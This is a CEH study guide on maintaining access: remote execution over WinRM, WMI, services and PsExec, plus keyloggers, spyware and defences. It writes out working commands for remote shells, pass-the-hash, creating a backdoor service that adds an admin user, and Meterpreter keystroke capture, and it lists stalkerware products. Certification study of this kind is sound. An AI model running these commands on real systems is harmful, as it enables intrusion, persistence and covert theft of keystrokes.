# 04 — Executing Applications, Keyloggers & Spyware

**CEH Objective:** Use different techniques to hide malicious programs and maintain remote access to the system (part A — execution & monitoring tooling).

Once an attacker has access and elevated privileges, the next stage in the CEH hacking methodology is **Maintaining Access** — colloquially, "owning" the system. This means running malicious code remotely to exfiltrate data, install persistence mechanisms, and monitor the victim on an ongoing basis. This file covers the mechanics of remote code execution and the two workhorse categories of "maintain access" malware: keyloggers and spyware.

---

## 1. Remote Code Execution Techniques

These are the mechanisms attackers use to get *arbitrary code running* on a target once they already have some level of access — the bridge between "I have credentials/a shell" and "I have an ongoing foothold."

### Exploitation for Client Execution
Targeting the software a user interacts with directly, rather than a server:
- **Web-browser-based** — spear-phishing links or drive-by-compromise sites that exploit the browser itself; often requires no user action beyond visiting a page.
- **Office-application-based** — malicious documents delivered via spear phishing that require the victim to open the file (macro abuse, embedded exploits).
- **Third-party-application-based** — targeting commonly installed software (PDF readers, browser plugins) known to lag behind on patching.

### Service Execution
Windows **Service Control Manager** can be driven from the command line to create a new service or modify an existing one, which — if that service runs as SYSTEM — is a reliable way to get persistent, privileged code execution.

### Windows Management Instrumentation (WMI)
WMI is a built-in Windows administration framework for querying and controlling system resources, both locally and remotely. Attackers abuse it for lateral movement (via **DCOM**, port 135) and remote command execution, gathering system information and planting persistence without dropping traditional executables that AV would flag.

### Windows Remote Management (WinRM)
A Windows-native remote management protocol that lets an authenticated user run executables, modify services, and touch the registry on a remote host over HTTP (port 5985) or HTTPS (port 5986). Attackers use the `winrm` command (or higher-level wrappers like Evil-WinRM) to execute payloads remotely as part of lateral movement, since it's built into Windows and often allowed through firewalls that would block other remote-execution vectors.

```powershell
# Native winrs — open an interactive remote shell over WinRM
winrs -r:http://10.10.1.20:5985 -u:administrator -p:Password123 cmd

# PowerShell remoting to the same effect
Enter-PSSession -ComputerName 10.10.1.20 -Credential (Get-Credential)
Invoke-Command -ComputerName 10.10.1.20 -ScriptBlock { whoami } -Credential $cred
```
```bash
# Evil-WinRM — full-featured WinRM shell client (Ruby, common on Kali)
evil-winrm -i 10.10.1.20 -u administrator -p 'Password123'
evil-winrm -i 10.10.1.20 -u administrator -H '<NTLM_hash>'   # pass-the-hash over WinRM
```

Windows Service Control Manager and WMI can also be driven directly for remote execution:
```cmd
:: Create and start a remote service that runs an arbitrary command (Service Execution technique)
sc \\10.10.1.20 create backdoorsvc binPath= "cmd /c net user hacker Passw0rd! /add" start= auto
sc \\10.10.1.20 start backdoorsvc

:: WMI — execute a process on a remote host with valid credentials
wmic /node:10.10.1.20 /user:administrator /password:Password123 process call create "cmd.exe /c whoami > C:\out.txt"
```

### Remote Execution Tool Index
| Tool | Purpose | Link |
|---|---|---|
| Dameware Remote Support | Remote Windows administration & AD management | https://www.solarwinds.com |
| Ninja | Post-exploitation remote administration | https://github.com |
| Pupy | Cross-platform remote administration | https://github.com |
| PDQ Deploy | Enterprise software deployment | https://www.pdq.com |
| ManageEngine Endpoint Central | Enterprise endpoint management | https://www.manageengine.com |
| PsExec | Remote process execution (Sysinternals) | https://www.microsoft.com |

```cmd
:: PsExec — interactive remote shell as SYSTEM
PsExec.exe \\10.10.1.20 -s cmd.exe

:: PsExec — run a single command remotely with specific credentials
PsExec.exe \\10.10.1.20 -u administrator -p Password123 cmd /c "whoami"

:: PsExec — copy and run a binary on the remote host, interactively
PsExec.exe \\10.10.1.20 -c payload.exe
```

---

## 2. Keyloggers

A keylogger is exactly what it sounds like: hardware or software that silently records every keystroke a user types, and either logs it locally for later retrieval or streams it out to the attacker. Because keyloggers capture input **before encryption ever applies** (i.e., at the point the human is typing), they defeat HTTPS, encrypted messaging apps, and encrypted disks alike — the attacker never needs to break any cryptography, just watch the keyboard.

What a capable keylogger can do beyond raw keystrokes:
- Take periodic screenshots correlated with typed input
- Log window titles and launched application names
- Record visited URLs and search terms
- Capture clipboard contents (copy/paste of passwords, card numbers, etc.)
- Persist across reboots and evade security scans
- Encrypt its own logs before exfiltration to blend in with legitimate traffic

### Hardware Keyloggers
Physical devices inserted between the keyboard and the computer. Their defining advantage is that they're **completely OS-independent** — no software runs on the target at all, so anti-keylogger *software* cannot detect them. Their weakness is the need for physical access, both to install and to retrieve.

| Sub-type | Mechanism |
|---|---|
| PC/BIOS embedded | Modified keyboard-management firmware; needs physical/admin access to install |
| Keylogger keyboard (cable) | Circuit attached to the keyboard cable connector; logs to internal memory |
| PS/2 & USB (external) | Transparent inline device between keyboard and port; no drivers needed |
| Acoustic/CAM | Converts keystroke sound (or camera footage of typing) into keystroke data |
| Bluetooth | Physical install once, then retrieve logs wirelessly |
| Wi-Fi | Connects to local Wi-Fi and emails logs, or is queryable over TCP/IP |

### Software Keyloggers
Installed remotely (email attachment, drive-by download, bundled installer) and logging to a file that's periodically exfiltrated.

| Sub-type | Mechanism |
|---|---|
| Application | Observes keystrokes within specific monitored applications |
| Kernel / rootkit / device driver | Runs at kernel level as a forged device driver; extremely hard to detect even with dedicated tools |
| Hypervisor-based | Operates from a malicious hypervisor beneath the OS itself |
| Form-grabbing | Captures web form submissions after HTTPS decryption, at the "submit" event |
| JavaScript-based | Injected script listens for `onKeyUp()`/`onKeyDown()` events on a compromised page |
| Memory-injection-based | Patches memory tables used by the browser/OS to log keystrokes; also used to bypass UAC |

### Remote Keylogging via Metasploit (Meterpreter)
```
ps                          # list running processes and PIDs
getpid
migrate <PID>                # migrate into a stable, unlikely-to-close process (e.g. explorer.exe)
keyscan_start                 # start capturing keystrokes
keyscan_dump                  # dump captured keystrokes
```

### Keylogger Tool Index
| Tool | Category | Link |
|---|---|---|
| Spyrix Personal Monitor | Software keylogger (hidden from AV/anti-rootkit) | https://www.spyrix.com |
| REFOG Personal Monitor | Windows keylogger | https://www.refog.com |
| All In One Keylogger | Windows keylogger | https://www.relytec.com |
| Revealer Keylogger Pro | Windows keylogger | https://www.logixoft.com |
| Hoverwatch | macOS keylogger | https://www.refog.com |
| KeyGrabber (USB/PS2/Nano Wi-Fi) | Hardware keylogger | https://www.keelog.com |

### Defending Against Keyloggers
- Use a **password manager** with auto-fill instead of typing credentials manually.
- Use the Windows **on-screen keyboard** for sensitive entries where a hardware keylogger is a concern.
- Keep **anti-spyware/antivirus** signatures current and scan before installing new software.
- Deploy **host-based IDS**, keystroke-interference (character randomization) software, and application whitelisting.
- Physically inspect keyboard cabling in sensitive/shared environments.
- Employ **MFA/OTP** so a stolen keystroke log alone isn't enough to authenticate.
- Use **EDR** with behavioral detection, memory forensics, and file-integrity monitoring to catch kernel/hypervisor-level loggers that evade signature scanning.

---

## 3. Spyware

Spyware is broader than a keylogger — stealthy monitoring software that watches and reports on user activity generally, often bundled ("piggybacked") inside freeware or installed via drive-by download. Like a Trojan, it hides its own processes and files to resist detection and removal.

**Typical capabilities:**
- Steal personal information and exfiltrate it to a remote server
- Log browsing activity and search history
- Hijack browser settings (home page, search provider, DNS)
- Reduce system performance and stability
- Redirect to advertising or malicious sites
- Activate the microphone/webcam covertly
- Distribute further malware from the compromised host
- Harvest hardware/software/network inventory for follow-on exploitation

### The Eleven Spyware Categories

| Category | What it does |
|---|---|
| **Desktop Spyware** | Records desktop activity, software usage, keystrokes; can log audio/video via mic/webcam |
| **Email Spyware** | Monitors/forwards all incoming and outgoing email, including instant messages |
| **Internet Spyware** | Logs all visited URLs and time spent per site; can block specified sites/keywords |
| **Child-Monitoring Spyware** | Tracks online/offline child activity; parental-control framing, same mechanics as any other spyware |
| **Screen-Capturing Spyware** | Periodic or triggered screenshots of user activity, sent to email/FTP |
| **USB Spyware** | Copies data from connected USB devices without notification; also useful for USB device-driver debugging in legitimate contexts |
| **Audio Spyware** | Records ambient sound, calls, and voice-chat conversations |
| **Video Spyware** | Covertly records webcam/video feeds on a schedule; supports remote live viewing |
| **Print Spyware** | Logs all printer activity (job content, page counts, timestamps) to an encrypted log |
| **Telephone/Cellphone Spyware** | Full phone monitoring — call history, texts (including deleted), browsing history, GPS |
| **GPS Spyware** | Tracks and logs physical location over time via GPS |

### Spyware Tool Index
| Tool | Category | Link |
|---|---|---|
| Spytech SpyAgent | Desktop monitoring | https://www.spytech-web.com |
| Spyrix Personal Monitor | Remote monitoring (keystrokes, screenshots, webcam) | https://www.spyrix.com |
| CurrentWare / FlexiSPY / NetVizor | Desktop/child-monitoring | vendor sites |
| mSpy / XNSPY / iKeyMonitor / Highster Mobile | Telephone/cellphone monitoring | vendor sites |
| SPYERA / Snoopza / Mobistealth | GPS tracking | vendor sites |
| USB Monitor / USBDeview | USB activity monitoring | https://www.hhdsoftware.com / https://www.nirsoft.net |

### Defending Against Spyware
- Keep browser security settings at **medium or higher**, never disable them for convenience.
- Never open unsolicited attachments or click links from unknown senders.
- Only download software from **trusted, verified sources**; scan installers with anti-spyware before running them.
- Keep the OS and all software patched.
- Enable outbound firewall protection to catch spyware trying to phone home.
- Install and regularly run dedicated **anti-spyware** software as a first line of defense — not just general antivirus.
- Use privacy-focused browser extensions to block tracking scripts.
- Regularly review Task Manager / process lists for unfamiliar background processes.
- Verify app permissions (camera, microphone, location) before granting them, on both desktop and mobile.

### Anti-Spyware Tool Index
| Tool | Link |
|---|---|
| SUPERAntiSpyware | https://www.superantispyware.com |
| Malwarebytes | https://www.malwarebytes.com |
| Avast One | https://www.avast.com |
| Kaspersky Total Security | https://support.kaspersky.com |
| MacScan 3 | https://www.securemac.com |

**Next:** [05 — Hiding Files: Rootkits, NTFS ADS & Steganography](./05-Hiding-Files-Rootkits-ADS-Steganography.md)
